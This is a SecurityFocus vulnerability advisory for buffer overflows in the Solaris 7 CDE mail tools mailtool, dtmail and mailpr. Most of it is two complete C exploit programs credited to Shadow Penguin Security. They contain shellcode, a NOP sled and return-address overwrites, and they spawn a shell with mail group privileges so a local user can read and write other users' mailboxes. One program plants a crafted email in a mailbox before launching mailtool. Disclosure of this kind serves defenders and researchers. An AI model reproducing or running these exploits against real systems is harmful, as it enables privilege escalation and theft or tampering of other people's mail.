source: http://www.securityfocus.com/bid/832/info

here are three buffer overflow vulnerabilities in the CDE mail utilities, all of which are installed sgid mail by default.

The first is exploited through overrunning a buffer in the Content-Type: field, which would look something like this:

Content-Type: image/aaaaaaaa long 'a' aaaaaa; name="test.gif"

mailtool will overflow when email is selected which has a content-type field like that. It may be possible for an attacker to obtain root priviliges if shellcode is written appropriately and root selects the malicious email message.

The second vulnerability is in dtmail, which will crash (and possibly execute arbitrary code) if a long paramater is passed argumenting the -f command-line option.

The third is in mailpr, which is vulnerable to a long -f paramater as well.

The most basic consequence of these being exploited is a compromise of local email, since all mail data is set mode 660, read and write permissions granted for members of group mail.

As of November 30, 1999, Solaris 7 is the only known vulnerable platform.

ex_mailtool.c
-----
/*=============================================================================
   Solaris mailtool exploit for Solaris7 Intel Edition
   The Shadow Penguin Security (http://shadowpenguin.backsection.net)
   Written by UNYUN  (shadowpenguin@backsection.net)
   Descripton:
     Local user can read/write any user's mailbox
   Usage:
     setenv DISPLAY yourdisply
     gcc ex_mailtool.c
     ./a.out /var/mail/[any user]
     - Choice "exploit@localhost" mail
  =============================================================================
*/

#include <stdio.h>

#define FAKEADR 96
#define FAKEOFS 0x1000
#define RETADR  84
#define RETOFS  0x1224
#define EXPADR  300
#define NOP     0x90
#define MAXBUF  2000
#define DIR     "/usr/openwin/bin"

#define HEAD \
"From exploit@localhost Fri Nov 26 00:01 JST 1999\n"\
"Content-Type: multipart/mixed; "\
"boundary=\"VGh1LCAyNSBOb3YgMTk5OSAyMjozOTo1MSArMDkwMA==\"\n"\
"Content-Length: 340\n\n"\
"--VGh1LCAyNSBOb3YgMTk5OSAyMjozOTo1MSArMDkwMA==\n"\
"Content-Type: image/%s; name=\"test.gif\"\n"\
"Content-Disposition: attachment;\n"\
" filename=\"test.gif\"\n"\
"Content-Transfer-Encoding: base64\n\n"\
"IA==\n\n"\
"--VGh1LCAyNSBOb3YgMTk5OSAyMjozOTo1MSArMDkwMA==--\n\n"

unsigned long get_sp(void)
{
  __asm__(" movl %esp,%eax ");
}

char exploit_code[2000] =
"\xeb\x1c\x5e\x33\xc0\x33\xdb\xb3\x08\xfe\xc3\x2b\xf3\x88\x06"
"\x6a\x06\x50\xb0\x88\x9a\xff\xff\xff\xff\x07\xee\xeb\x06\x90"
"\xe8\xdf\xff\xff\xff\x55\x8b\xec\x83\xec\x08\xeb\x5d\x33\xc0"
"\xb0\x3a\xfe\xc0\xeb\x16\xc3\x33\xc0\x40\xeb\x10\xc3\x5e\x33"
"\xdb\x89\x5e\x01\xc6\x46\x05\x07\x88\x7e\x06\xeb\x05\xe8\xec"
"\xff\xff\xff\x9a\xff\xff\xff\xff\x0f\x0f\xc3\x5e\x33\xc0\x89"
"\x76\x08\x88\x46\x07\x33\xd2\xb2\x06\x02\xd2\x89\x04\x16\x50"
"\x8d\x46\x08\x50\x8b\x46\x08\x50\xe8\xb5\xff\xff\xff\x33\xd2"
"\xb2\x06\x02\xd2\x03\xe2\x6a\x01\xe8\xaf\xff\xff\xff\x83\xc4"
"\x04\xe8\xc9\xff\xff\xff/tmp/xx";

main(int argc, char *argv[])
{
    static char     buf[MAXBUF];
    FILE        *fp;
    unsigned int    i,ip,sp;

    if (argc!=2){
        printf("usage : %s mailbox\n",argv[0]);
        exit(1);
    }
    putenv("LANG=");
    sp=get_sp();
    system("ln -s /bin/ksh /tmp/xx");
    printf("esp  = 0x%x\n",sp);
    memset(buf,NOP,MAXBUF);
    buf[MAXBUF-1]=0;

    ip=sp-FAKEOFS;
    printf("fake = 0x%x\n",ip);
    buf[FAKEADR  ]=ip&0xff;
    buf[FAKEADR+1]=(ip>>8)&0xff;
    buf[FAKEADR+2]=(ip>>16)&0xff;
    buf[FAKEADR+3]=(ip>>24)&0xff;
    ip=sp-RETOFS;
    printf("eip  = 0x%x\n",ip);
    buf[RETADR  ]=ip&0xff;
    buf[RETADR+1]=(ip>>8)&0xff;
    buf[RETADR+2]=(ip>>16)&0xff;
    buf[RETADR+3]=(ip>>24)&0xff;

    strncpy(buf+EXPADR,exploit_code,strlen(exploit_code));

    if ((fp=fopen(argv[1],"ab"))==NULL){
        printf("Can not write '%s'\n",argv[1]);
        exit(1);
    }
    fprintf(fp,HEAD,buf);
    fclose(fp);
    printf("Exploit mail has been added.\n");
    printf("Choice \"exploit@localhost\" mail.\n");
    sprintf(buf,"cd %s; mailtool",DIR);
    system(buf);
}


ex_mailtool.c
-----
/*=============================================================================
   Solaris dtmailpr exploit for Solaris7 Intel Edition
   The Shadow Penguin Security (http://shadowpenguin.backsection.net)
   Written by UNYUN  (shadowpenguin@backsection.net)
   Descripton:
     Local user can read/write any user's mailbox
  =============================================================================
*/

#include <stdio.h>

#define RETADR  1266
#define RETOFS  0x1d88
#define EXPADR  300
#define NOP 0x90
#define MAXBUF  2000

unsigned long get_sp(void)
{
  __asm__(" movl %esp,%eax ");
}

char exploit_code[2000] =
"\xeb\x1c\x5e\x33\xc0\x33\xdb\xb3\x08\xfe\xc3\x2b\xf3\x88\x06"
"\x6a\x06\x50\xb0\x88\x9a\xff\xff\xff\xff\x07\xee\xeb\x06\x90"
"\xe8\xdf\xff\xff\xff\x55\x8b\xec\x83\xec\x08\xeb\x5d\x33\xc0"
"\xb0\x3a\xfe\xc0\xeb\x16\xc3\x33\xc0\x40\xeb\x10\xc3\x5e\x33"
"\xdb\x89\x5e\x01\xc6\x46\x05\x07\x88\x7e\x06\xeb\x05\xe8\xec"
"\xff\xff\xff\x9a\xff\xff\xff\xff\x0f\x0f\xc3\x5e\x33\xc0\x89"
"\x76\x08\x88\x46\x07\x33\xd2\xb2\x06\x02\xd2\x89\x04\x16\x50"
"\x8d\x46\x08\x50\x8b\x46\x08\x50\xe8\xb5\xff\xff\xff\x33\xd2"
"\xb2\x06\x02\xd2\x03\xe2\x6a\x01\xe8\xaf\xff\xff\xff\x83\xc4"
"\x04\xe8\xc9\xff\xff\xff/tmp/xx";

main()
{
    static char     buf[MAXBUF+1000];
    FILE        *fp;
    unsigned int    i,ip,sp;

    putenv("LANG=");
    sp=get_sp();
    system("ln -s /bin/ksh /tmp/xx");
    printf("esp  = 0x%x\n",sp);
    memset(buf,NOP,MAXBUF);
    ip=sp-RETOFS;
    printf("eip  = 0x%x\n",ip);
    buf[RETADR  ]=ip&0xff;
    buf[RETADR+1]=(ip>>8)&0xff;
    buf[RETADR+2]=(ip>>16)&0xff;
    buf[RETADR+3]=(ip>>24)&0xff;
    strncpy(buf+EXPADR,exploit_code,strlen(exploit_code));
    buf[MAXBUF-1]=0;
    execl("/usr/dt/bin/dtmailpr","dtmailpr","-f",buf,0);
}